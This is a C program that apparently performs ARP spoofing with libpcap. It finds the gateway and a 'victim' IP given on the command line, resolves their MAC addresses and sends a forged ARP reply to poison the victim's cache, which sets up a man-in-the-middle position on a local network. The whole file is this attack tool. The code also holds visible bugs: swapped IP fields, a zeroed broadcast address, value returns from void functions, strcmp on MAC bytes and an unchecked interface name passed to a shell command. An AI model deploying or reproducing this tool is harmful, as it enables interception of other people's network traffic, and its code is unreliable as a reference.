#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <pcap.h>
#include "header.h"

#define ETH_H         14
#define ARP_H         28
#define ETH_ARP_H     42
#define PAD_H         18 
#define ETH_ARP_PAD_H 60

#define IP_ADDR_LEN      4
#define ETHER_ADDR_LEN   6

#define MEMSET_BROADCAST -1

typedef struct ETH_ARP_Header
{

    struct libnet_ethernet_hdr ethernet_hdr;
    struct libnet_arp_hdr arp_hdr;

}ETH_ARP_Header;

typedef struct IP_MAC_Information
{

    struct in_addr myIP;
    struct in_addr gatewayIP;
    struct in_addr victimIP;
    u_int8_t myMAC[ETHER_ADDR_LEN];
    u_int8_t gatewayMAC[ETHER_ADDR_LEN];
    u_int8_t victimMAC[ETHER_ADDR_LEN];

}IP_MAC_Information;


pcap_t *adhandle;
int interface[IFNAMSIZ] = {0x0};


void getMYinformation(const uint8_t *interface, struct in_addr *my_ip, uint8_t *my_host)
{
    struct ifreq ifr;
    int32_t fd;

    fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(fd < 0)
        return -1;

    memcpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(fd, SIOCGIFADDR, &ifr) == -1)
    {
        close(fd);
        return -1;
    }

    memcpy(&my_ip->s_addr, ifr.ifr_addr.sa_data + (ETHER_ADDR_LEN-IP_ADDR_LEN), IP_ADDR_LEN);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1)
        return -1;

    memcpy(my_host, ifr.ifr_hwaddr.sa_data, ETHER_ADDR_LEN);
}


void get_gateway_ip(const uint8_t *interface, struct in_addr *gateway_ip) {
    char cmd[1000] = {0x0};
    char line[256] = {0x0};

    sprintf(cmd, "route -n |grep %s |grep 'UG[ \t]' |awk '{print $2}'", interface);
    FILE* fp = popen(cmd, "r");

    if(fgets(line, sizeof(line), fp) == NULL)
    {
        printf("Fail : Gateway MAC\n");
        return -1;
    }
    else
    {
        line[strlen(line) - 1] = '\0';
        inet_pton(AF_INET, line, &gateway_ip->s_addr);
        pclose(fp);
    }
}

void set_arp_packet(ETH_ARP_Header *pkt, const struct in_addr *src_ip, const struct in_addr *dst_ip, const uint8_t *dst_host, const uint16_t opcode) {

    pkt->arp_hdr.ar_op = htons(opcode);
    memcpy(pkt->arp_hdr.desti_ip, &src_ip->s_addr, IP_ADDR_LEN);
    memcpy(pkt->arp_hdr.source_ip, &dst_ip->s_addr, IP_ADDR_LEN);

    // Broadcast
    if (dst_host == NULL)
    {
        memset(pkt->ethernet_hdr.ether_dhost, 0, ETHER_ADDR_LEN);
        memset(pkt->arp_hdr.desti_host, 0, ETHER_ADDR_LEN);
    }
    // Destination
    else
    {
        memcpy(pkt->ethernet_hdr.ether_dhost, dst_host, ETHER_ADDR_LEN);
        memcpy(pkt->arp_hdr.desti_host, dst_host, ETHER_ADDR_LEN);
    }
}

void send_packet(pcap_t *fp, const uint8_t *packet)
{
    if (pcap_sendpacket(fp, packet, ETH_ARP_H) != 0)
    {
        printf("sendPacket Error\n");
        return -1;
    }
}

void recv_arp_packet(pcap_t *fp, uint8_t *host, const uint8_t *dst_host, const uint16_t opcode) {
    int res;
    struct pcap_pkthdr *header;
    const uint8_t *packet;
    ETH_ARP_Header *pkt;

    while ((res = pcap_next_ex(fp, &header, &packet)) >= 0) {
        if (res == 0) 
            continue;
        pkt = (ETH_ARP_Header *)packet;
        if (pkt->ethernet_hdr.ether_type != htons(ETHERTYPE_ARP))
            continue;
        if (pkt->arp_hdr.ar_op != htons(opcode))
            continue;
        if (dst_host != NULL)
            if (strcmp(dst_host, pkt->arp_hdr.desti_host))
                continue;
        break;
    }
    if (res == -1) {
        perror(pcap_geterr(fp));
        exit(1);
    }
    if (host != NULL)
        memcpy(host, pkt->ethernet_hdr.ether_shost, ETHER_ADDR_LEN);
}

void print(const uint8_t *addr, const uint32_t addr_len) {
    uint8_t ip_addr_str[IP_ADDR_STR_SIZE];
    int i = 0;

    switch (addr_len)
    {
        case IP_ADDR_LEN:
            inet_ntop(AF_INET, addr, ip_addr_str, IP_ADDR_STR_SIZE);
            printf("%s\n", ip_addr_str);
            break;
        case ETHER_ADDR_LEN:
            for(i = 0; i<6; i++)
                printf("%02x:", addr[i]);
                printf("\n");
            break;
        default:
            break;
    }
}



int main(int argc, char *argv[])
{
//    OpenInterface();    //Open and Access


    IP_MAC_Information info;

    pcap_if_t *alldevs, *dev;
    int interfaceNum, i=0;
    char errbuf[PCAP_ERRBUF_SIZE];

    if(pcap_findalldevs(&alldevs, errbuf)==1)
    {
        fprintf(stderr, "Error in pcap_indalldev", errbuf);
        exit(1);
    }

    for(dev = alldevs; dev; dev=dev->next)
    {
        printf("%d, %s", ++i, dev->name);
        if(dev->description)
            printf(" %s\n", dev->description);
        else
            printf("No description !!! \n");
    }

    if(i ==0)
    {
        printf("No interface!!! \n");
        return -1;
    }

    printf("Select Interface\n");
    scanf("%d", &interfaceNum);

    for(dev = alldevs, i=0; i<interfaceNum -1; dev=dev->next, i++);

    if((adhandle=pcap_open_live(dev->name, 65536, 1, 1000, errbuf))==NULL)
    {
        printf("No support interface!!! \n");
        return -1;
    }
    else
    {
        memcpy(interface, dev->name, strlen(dev->name));
        pcap_freealldevs(alldevs);
    }

    getMYinformation(interface, &info.myIP, info.myMAC);

    //get my ip address
    printf("my IP address : ");
    print((uint8_t *)&info.myIP.s_addr, IP_ADDR_LEN);

    //get my mac address
    printf("my MAC address : ");
    print(info.myMAC, ETHER_ADDR_LEN);

    //get gateway ip address
    get_gateway_ip(interface, &info.gatewayIP);
    inet_pton(AF_INET, argv[1], &info.victimIP.s_addr);
    printf("Gateway IP : ");
    print((uint8_t *)&info.gatewayIP.s_addr, IP_ADDR_LEN);

    printf("Victim IP : ");

    print((uint8_t *)&info.victimIP.s_addr, IP_ADDR_LEN);
    uint8_t packet[ETH_ARP_PAD_H] = {0x0};
    ETH_ARP_Header *pkt = (ETH_ARP_Header *)packet;

    set_arp_packet(pkt, &info.gatewayIP, &info.myIP, NULL, ARPOP_REQUEST);
    send_packet(adhandle, packet);
    recv_arp_packet(adhandle, info.gatewayMAC, info.myMAC, ARPOP_REPLY);
    printf("Gateway MAC : ");
    print(info.gatewayMAC, ETHER_ADDR_LEN);

    set_arp_packet(pkt, &info.victimIP, &info.myIP, NULL, ARPOP_REQUEST);
    send_packet(adhandle, packet);
    recv_arp_packet(adhandle, info.victimMAC, info.myMAC, ARPOP_REPLY);
    printf("Victim MAC : ");
    print(info.victimMAC, ETHER_ADDR_LEN);

    printf("Start spoofing\n");
    set_arp_packet(pkt, &info.victimIP, &info.gatewayIP, info.victimMAC, ARPOP_REPLY);
    send_packet(adhandle, packet);
    return 0;
}
